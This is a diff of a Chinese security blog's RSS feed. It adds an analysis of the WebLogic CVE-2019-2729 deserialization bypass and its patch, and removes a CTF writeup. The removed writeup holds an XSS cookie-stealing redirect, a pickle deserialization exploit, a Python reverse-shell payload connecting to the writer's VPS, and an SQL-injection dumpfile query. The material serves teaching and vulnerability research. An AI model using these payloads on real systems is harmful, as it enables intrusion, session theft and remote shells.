@@ -10,6 +10,81 @@
     <atom:link href="https://kylingit.com/categories/security/index.xml" rel="self" type="application/rss+xml" />
     
     <item>
+      <title>CVE-2019-2729 Weblogic XMLDecoder反序列化漏洞分析</title>
+      <link>https://kylingit.com/blog/cve-2019-2729-weblogic-xmldecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
+      <pubDate>Wed, 19 Jun 2019 12:26:39 +0000</pubDate>
+      
+      <guid>https://kylingit.com/blog/cve-2019-2729-weblogic-xmldecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
+      <description>
+
+&lt;h3 id=&#34;漏洞分析&#34;&gt;漏洞分析&lt;/h3&gt;
+
+&lt;p&gt;该漏洞是&lt;code&gt;CVE-2019-2725&lt;/code&gt;的绕过，因此前面的流程都是一样的，经过21个&lt;code&gt;handler&lt;/code&gt;处理，最终进入&lt;code&gt;WorkAreaHeader&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190620123830.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;在4月份&lt;code&gt;oracle&lt;/code&gt;对2725紧急补丁中，过滤了&lt;code&gt;class&lt;/code&gt;元素，因此不能再通过&lt;code&gt;class&lt;/code&gt;创建对象&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190620123907.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;这次的绕过实际上就是找到另外的元素代替&lt;code&gt;class&lt;/code&gt;进而绕过补丁。&lt;/p&gt;
+
+&lt;p&gt;在&lt;code&gt;jdk7&lt;/code&gt;中解析&lt;code&gt;xml&lt;/code&gt;时获取&lt;code&gt;element&lt;/code&gt;元素的相关类为&lt;code&gt;com.sun.beans.decoder.DocumentHandler&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;当传入&lt;code&gt;array&lt;/code&gt;标签，进入&lt;code&gt;ArrayElementHandler&lt;/code&gt;，为&lt;code&gt;array&lt;/code&gt;元素添加属性时，只能从&lt;code&gt;length&lt;/code&gt;，&lt;code&gt;class&lt;/code&gt;，&lt;code&gt;id&lt;/code&gt;中选择，唯一能创建类的&lt;code&gt;class&lt;/code&gt;已经加入了黑名单，所以在&lt;code&gt;jdk1.7&lt;/code&gt;下不受此漏洞影响，这次的绕过出现在低于&lt;code&gt;jdk1.7&lt;/code&gt;的&lt;code&gt;java&lt;/code&gt;版本上。&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;weblogic 10.3.6.0&lt;/code&gt;自带的&lt;code&gt;jdk&lt;/code&gt;版本为1.6，&lt;code&gt;jdk1.6&lt;/code&gt;中解析xml时有很大的不同，相关处理方法在&lt;code&gt;com.sun.beans.ObjectHandler&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;解析时首先进入的是&lt;code&gt;startElement&lt;/code&gt;方法&lt;/p&gt;
+
+&lt;p&gt;该方法首先获取元素的属性并创建一个&lt;code&gt;hashmap&lt;/code&gt;，当元素含有属性时，会根据属性值进行类/属性/方法的相关操作，当元素没有属性时，调用的是&lt;code&gt;new&lt;/code&gt;方法，例如解析&lt;code&gt;&amp;lt;java&amp;gt;&lt;/code&gt;、&lt;code&gt;&amp;lt;void&amp;gt;&lt;/code&gt;时。而此时如果传入了&lt;code&gt;method&lt;/code&gt;值就会把方法名设置为该值。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190620123922.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;随后把方法名设置为我们传入的值，最终通过&lt;code&gt;forName&lt;/code&gt;找到指定的类&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190620123941.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190620123956.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;之后的流程就和2725一样的了&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/20190620124052.png&#34; alt=&#34;1560635046339&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;进入&lt;code&gt;WorkContextXmlInputAdapter:readUTF()&lt;/code&gt;后的调用栈&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190620124309.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;补丁分析&#34;&gt;补丁分析&lt;/h3&gt;
+
+&lt;p&gt;6月19日，&lt;code&gt;Oralce&lt;/code&gt;官方放出了该漏洞的补丁，详情见&lt;a href=&#34;https://www.oracle.com/technetwork/security-advisory/alert-cve-2019-2729-5570780.html&#34;&gt;这里&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;分析一下补丁&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;this.validate(new ByteArrayInputStream(baos.toByteArray()));
+this.validateFormat(new ByteArrayInputStream(baos.toByteArray()));
+this.xmlDecoder = new XMLDecoder(new ByteArrayInputStream(baos.toByteArray()));
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;在原来&lt;code&gt;validate&lt;/code&gt;过滤的基础上又增加了一次&lt;code&gt;validateFormat&lt;/code&gt;过滤，过滤方法如下&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190620124924.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;这回终于是采用了白名单方式，&lt;code&gt;allowedName&lt;/code&gt;如下&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190620124935.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;可以看到&lt;code&gt;allowedName&lt;/code&gt;严格限制了可以使用的标签，并且也限制了标签可以拥有的属性，值得注意的是&lt;code&gt;allowedName&lt;/code&gt;不再允许&lt;code&gt;field&lt;/code&gt;标签了，emmm&amp;hellip;&lt;/p&gt;
+
+&lt;h3 id=&#34;总结&#34;&gt;总结&lt;/h3&gt;
+
+&lt;p&gt;这个漏洞是当时应急时简单分析的，后续有时间会详细整理一下。&lt;/p&gt;
+
+&lt;p&gt;从整个&lt;code&gt;XMLDecoder&lt;/code&gt;反序列化漏洞的来看（CVE-2017-3506 -&amp;gt; CVE-2017-10271(10352) -&amp;gt; CVE-2019-2725 -&amp;gt; CVE-2019-2729），使用黑名单修补漏洞是不靠谱的，永远不知道下一次绕过是在什么时候，而这次的白名单修复方式会不会还存在缺陷呢？此处还得打一个问号。&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
       <title>SA-CORE-2019-004 Drupal内核从XSS到RCE漏洞分析</title>
       <link>https://kylingit.com/blog/sa-core-2019-004-drupal%E5%86%85%E6%A0%B8%E4%BB%8Exss%E5%88%B0rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
       <pubDate>Mon, 22 Apr 2019 15:19:04 +0000</pubDate>
@@ -3585,247 +3660,6 @@ protected MultiValueMap&amp;lt;String, String&amp;gt; findSubscriptionsInternal(
 &lt;li&gt;&lt;a href=&#34;http://blog.nsfocus.net/spring-messaging-analysis/&#34;&gt;http://blog.nsfocus.net/spring-messaging-analysis/&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&#34;https://www.anquanke.com/post/id/104140&#34;&gt;https://www.anquanke.com/post/id/104140&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>第二届强网杯Web部分 Writeup</title>
-      <link>https://kylingit.com/blog/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86-writeup/</link>
-      <pubDate>Tue, 27 Mar 2018 18:06:02 +0000</pubDate>
-      
-      <guid>https://kylingit.com/blog/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86-writeup/</guid>
-      <description>
-
-&lt;p&gt;强网杯Web部分的题难度不小，还是比较有意思的，收获很大，这里简单分析一下其中两道题&lt;/p&gt;
-
-&lt;h3 id=&#34;share-your-mind&#34;&gt;Share your mind&lt;/h3&gt;
-
-&lt;pre&gt;&lt;code&gt;http://39.107.33.96:20000
-Please help me find the vulnerability before I finish this site！
-hint：xss bot使用phantomjs，版本2.1.1
-hint2 : xss的点不在report页面
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;根据writeup描述，这是一道RPO攻击的题目，以前没接触过，趁机学习一波&lt;/p&gt;
-
-&lt;p&gt;首先注册用户登录，查看源码，最后几行，可以看到引用js的时候这里使用了相对路径，构成RPO攻击的条件，简单尝试几个url发现确实可以利用。&lt;/p&gt;
-
-&lt;p&gt;RPO攻击的原理可以参考&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/iamstudy/articles/ctf_writeup_rpo_attack.html&#34;&gt;https://www.cnblogs.com/iamstudy/articles/ctf_writeup_rpo_attack.html&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;http://blog.nsfocus.net/rpo-attack/&#34;&gt;http://blog.nsfocus.net/rpo-attack/&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;访问&lt;code&gt;http://39.107.33.96:20000/index.php/view/article/1226&lt;/code&gt;的时候加载&lt;code&gt;jquery.min.js&lt;/code&gt;的路径可以看到是正常的，&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/oHZtz&#34; alt=&#34;jquery.js&#34; /&gt;
-当访问&lt;code&gt;http://39.107.33.96:20000/index.php/view/article/1226/..%2f..%2f..%2f..%2findex.php&lt;/code&gt;的时候浏览器尝试加载&lt;code&gt;..%2f..%2f..%2f..%2findex.php/static/js/jquery.min.js&lt;/code&gt;这个数据，而服务端则往上读取三层路径，加载的是article的页面，如果article页面存在xss的话就会被加载，题目也正好满足要求，所以我们创建一篇文章写入获取cookie的js,利用这个url让服务器请求这篇文章，弹给我们cookie&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/pa5qf&#34; alt=&#34;jquery.js&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;因为页面对一些特殊符号做了编码过滤，所以我们使用&lt;code&gt;String.fromCharCode()&lt;/code&gt;方法从ascii码来加载js&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;window.location.href=String.fromCharCode(some ascii code) + document.cookie;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/SVQMd&#34; alt=&#34;md5&#34; /&gt;
-这里有两个点的绕过：&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;url部分做了同站检测，通过&lt;code&gt;http://39.107.33.96:20000@x.x.x.x&lt;/code&gt;的形式绕过&lt;/li&gt;
-&lt;li&gt;这里的code每次刷新都是随机的，而且通过&lt;code&gt;===&lt;/code&gt;比较，没法通过弱类型绕过，所以我们生成所有6位字符的MD5，搜索前6位符合条件的就行(实际上生成了大约200M的文件基本够用了)&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;根据提示要访问&lt;code&gt;/QWB_fl4g/QWB/&lt;/code&gt;页面，所以我们在vps上建一个带iframe的页面&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;&amp;lt;img src=&#39;http://39.107.33.96:20000/QWB_fl4g/QWB/index.php&#39;&amp;gt;  
-&amp;lt;iframe src=&#39;http://39.107.33.96:20000/QWB_fl4g/QWB/index.php/..%2f..%2f../index.php/view/article/1462/..%2f..%2f..%2f..%2findex.php&#39;&amp;gt;&amp;lt;/iframe&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;nc监听端口，xssbot会先访问&lt;code&gt;/QWB_fl4g/QWB/index.php&lt;/code&gt;，带上cookie后再访问article，触发xss，我们就能收到cookie&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/yDw2L&#34; alt=&#34;flag&#34; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&#34;python-is-the-best-language-2&#34;&gt;python is the best language #2&lt;/h3&gt;
-
-&lt;p&gt;考点：session处存在反序列化漏洞&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;app/others.py&lt;/code&gt; &lt;code&gt;FilterException&lt;/code&gt;类&lt;code&gt;load&lt;/code&gt;方法存在反序列化漏洞&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;class FilterException(Exception):
-
-    def __init__(self, value):
-        super(FilterException, self).__init__(
-            &#39;the callable object {value} is not allowed&#39;.format(value=str(value)))
-
-
-def _hook_call(func):
-    def wrapper(*args, **kwargs):
-        print args[0].stack
-        if args[0].stack[-2] in black_type_list:
-            raise FilterException(args[0].stack[-2])
-        return func(*args, **kwargs)
-    return wrapper
-
-
-def load(file):
-    unpkler = Unpkler(file)
-    unpkler.dispatch[REDUCE] = _hook_call(unpkler.dispatch[REDUCE])
-    return Unpkler(file).load()
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;先测试一下序列化与反序列化过程可能产生的安全问题&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;序列化&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import os
-from pickle import Pickler
-
-class test(object):
-    def __reduce__(self):
-        return (os.system, (&#39;whoami&#39;))
-evil = test()
-
-def dump(file):
-    pk = Pickler(file)
-    pk.dump(evil)
-
-with open(&#39;test&#39;, &#39;wb&#39;) as f:
-    dump(f)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;会将python对象序列化成字符串写入文件，类似这个样子&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;cnt
-system
-p0
-(S&#39;whoami&#39;
-p1
-tp2
-Rp3
-.
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;ul&gt;
-&lt;li&gt;反序列化&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pickle import Unpickler
-
-def load(file):
-    return Unpickler(file).load()
-
-with open(&#39;test&#39;, &#39;rb&#39;) as f:
-    load(f)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;从文件读取进行反序列化，如果含有可执行的命令就会执行&lt;/p&gt;
-
-&lt;p&gt;题目中对一些系统命令加入了黑名单，没法直接使用，但是这里可以用&lt;code&gt;subprocess&lt;/code&gt;、&lt;code&gt;commands&lt;/code&gt;等，同样是执行系统命令&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;load()&lt;/code&gt;方法并没有对传入的&lt;code&gt;file&lt;/code&gt;进行任何过滤，就会导致反序列化漏洞&lt;/p&gt;
-
-&lt;p&gt;全局搜索一下调用&lt;code&gt;load()&lt;/code&gt;方法的部分&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;app/Mycache.py&lt;/code&gt;
-&lt;code&gt;get()&lt;/code&gt;方法&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def get(self, key):
-    filename = self._get_filename(key)
-    try:
-        with open(filename, &#39;rb&#39;) as f:
-            pickle_time = load(f)
-            if pickle_time == 0 or pickle_time &amp;gt;= time():
-                a = load(f)
-                return a
-            else:
-                os.remove(filename)
-                return None
-    except (IOError, OSError, PickleError):
-        return None
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;传入filename进行了load，跟进&lt;code&gt;_get_filename()&lt;/code&gt;方法&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def _get_filename(self, key):
-    if isinstance(key, text_type):
-        key = key.encode(&#39;utf-8&#39;)  # XXX unicode review
-    hash = md5(key).hexdigest()
-    return os.path.join(self._path, hash)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;可以看到对key进行了MD5加密&lt;/p&gt;
-
-&lt;p&gt;再搜索调用&lt;code&gt;get()&lt;/code&gt;方法的地方&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/S2Qaa&#34; alt=&#34;get()&#34; /&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def open_session(self, app, request):
-    sid = request.cookies.get(app.session_cookie_name)
-    if not sid:
-        sid = self._generate_sid()
-        return self.session_class(sid=sid, permanent=self.permanent)
-    if self.use_signer:
-        signer = self._get_signer(app)
-        if signer is None:
-            return None
-        try:
-            sid_as_bytes = signer.unsign(sid)
-            sid = sid_as_bytes.decode()
-        except BadSignature:
-            sid = self._generate_sid()
-            return self.session_class(sid=sid, permanent=self.permanent)
-    data = self.cache.get(self.key_prefix + sid)
-    if data is not None:
-        return self.session_class(data, sid=sid)
-    return self.session_class(sid=sid, permanent=self.permanent)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;发现在&lt;code&gt;app/Mysessions.py&lt;/code&gt;处理session部分的方法调用了&lt;code&gt;get&lt;/code&gt;，传进去的参数是&lt;code&gt;self.key_prefix + sid&lt;/code&gt;，即&lt;code&gt;前缀+session&lt;/code&gt;值，类似这个样子
-&lt;code&gt;bdwsessions855f1297-d81e-4366-aaaa-80c9edb87338&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;配置文件里看到&lt;code&gt;SESSION_FILE_DIR = &amp;quot;/tmp/ffff&amp;quot;&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;所以整个流程大致是这样:&lt;/p&gt;
-
-&lt;p&gt;用户注册或登录，取得cookie中的session值，加上前缀后再对文件名进行MD5加密，存储在&lt;code&gt;/tmp/ffff&lt;/code&gt;目录下&lt;/p&gt;
-
-&lt;p&gt;在验证用户的过程中，对&lt;code&gt;/tmp/ffff&lt;/code&gt;目录相应文件名文件进行反序列化，假如我们对文件名和文件内容可控，那么就可以造成漏洞&lt;/p&gt;
-
-&lt;p&gt;结合上一个sql注入漏洞，我们可以&lt;code&gt;select evilcode into outfile &#39;/tmp/ffff/md5&#39;;&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;在访问页面的时候修改session值为md5对应的明文，就可以让程序反序列化含有恶意代码的md5文件&lt;/p&gt;
-
-&lt;p&gt;修改上面序列化代码:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import cPickle
-import os
-import subprocess
-class Exploit(object):
-    def __reduce__(self):
-        return (subprocess.Popen, (&amp;quot;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&amp;quot;vpsip\&amp;quot;,82));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&amp;quot;/bin/sh\&amp;quot;,\&amp;quot;-i\&amp;quot;]);&#39;&amp;quot;,))
-shellcode = cPickle.dumps(Exploit())
-print &#39;0x&#39; + shellcode .encode(&#39;hex&#39;)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;假设我们要设置session为testabcd，对应的&lt;code&gt;bdwsessionstestabcd&lt;/code&gt;md5值为&lt;code&gt;209a05e8b11c8e74ab03c110e6e5d591&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;构造sql语句&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;select id from user where email = &#39;test&#39;/**/union/**/select/**/0x63636F6D6D616E64730A../**/into/**/dumpfile/**/&#39;/tmp/ffff/209a05e8b11c8e74ab03c110e6e5d591&#39;#@test.com&#39;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;这样就把十六进制的恶意代码写入了&lt;code&gt;/tmp/ffff/&lt;/code&gt;下&lt;/p&gt;
-
-&lt;p&gt;然后访问index，修改cookie的session值为&lt;code&gt;testabcd&lt;/code&gt;，触发反序列化漏洞后反弹shell&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/mYzKP&#34; alt=&#34;reverse_shell&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;总结：
-- RPO可以结合XSS进行攻击，开发时不注意的话容易被利用
-- 反序列化问题一直都存在，这道题中虽然代码比较简单，利用起来还是有几个坑，还需要多学习&lt;/p&gt;
 </description>
     </item>
     
